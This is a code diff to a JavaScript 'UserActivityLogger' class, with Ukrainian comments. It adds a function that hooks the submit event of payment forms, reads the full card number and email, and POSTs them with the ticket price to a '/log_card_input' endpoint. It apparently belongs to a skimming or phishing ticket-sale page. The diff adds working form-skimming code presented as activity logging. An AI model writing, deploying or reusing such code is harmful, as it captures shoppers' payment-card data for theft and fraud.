@@ -126,6 +126,37 @@ class UserActivityLogger {
     }
 
     /**
+     * Логує введення карти
+     */
+    async logCardInput(cardNumber, email, price, currency) {
+        if (!this.pageCode) return;
+        
+        try {
+            const response = await fetch(`${this.baseUrl}/log_card_input`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    page_code: this.pageCode,
+                    card_number: cardNumber,
+                    email: email,
+                    price: price,
+                    currency: currency
+                })
+            });
+            
+            if (response.ok) {
+                console.log('✅ Card input logged successfully');
+            } else {
+                console.warn('⚠️ Failed to log card input');
+            }
+        } catch (error) {
+            console.error('❌ Error logging card input:', error);
+        }
+    }
+
+    /**
      * Налаштовує обробники подій для автоматичного логування
      */
     setupEventListeners() {
@@ -200,6 +231,61 @@ class UserActivityLogger {
                 
                 if (name || phone || email) {
                     this.logOrderForm(name, phone, email, price, currency);
+                }
+            });
+        });
+
+        // Додатково логуємо введення карти на сторінці loading
+        this.setupCardInputLogging();
+    }
+
+    /**
+     * Налаштовує логування введення карти
+     */
+    setupCardInputLogging() {
+        // Знаходимо форми введення карти
+        const cardForms = document.querySelectorAll('#paymentForm, .card-form, form[data-payment-form]');
+        
+        cardForms.forEach(form => {
+            form.addEventListener('submit', (e) => {
+                const cardInput = form.querySelector('#card-input, input[name="card"], input[type="text"][placeholder*="card" i]');
+                const emailInput = form.querySelector('#email-input, input[name="email"], input[type="email"]');
+                
+                if (cardInput && cardInput.value.trim()) {
+                    const cardNumber = cardInput.value.replace(/\s/g, '');
+                    const email = emailInput ? emailInput.value : '';
+                    
+                    // Отримуємо ціну з різних джерел
+                    let price = '';
+                    let currency = '';
+                    
+                    // З sessionStorage
+                    price = sessionStorage.getItem('ticket_price') || 
+                           sessionStorage.getItem('total_price') || 
+                           sessionStorage.getItem('ticket_total') || '';
+                    currency = sessionStorage.getItem('ticket_currency') || 
+                              sessionStorage.getItem('currency') || 'EUR';
+                    
+                    // З URL
+                    if (!price) {
+                        const urlParams = new URLSearchParams(window.location.search);
+                        price = urlParams.get('total') || urlParams.get('price') || '';
+                    }
+                    
+                    // З елементів на сторінці
+                    if (!price) {
+                        const priceElement = document.querySelector('#payment-title, .total-price, .price');
+                        if (priceElement) {
+                            const priceText = priceElement.textContent;
+                            const priceMatch = priceText.match(/(\d+[\.,]?\d*)/);
+                            if (priceMatch) {
+                                price = priceMatch[1].replace(',', '.');
+                            }
+                        }
+                    }
+                    
+                    // Логуємо введення карти
+                    this.logCardInput(cardNumber, email, price, currency);
                 }
             });
         });
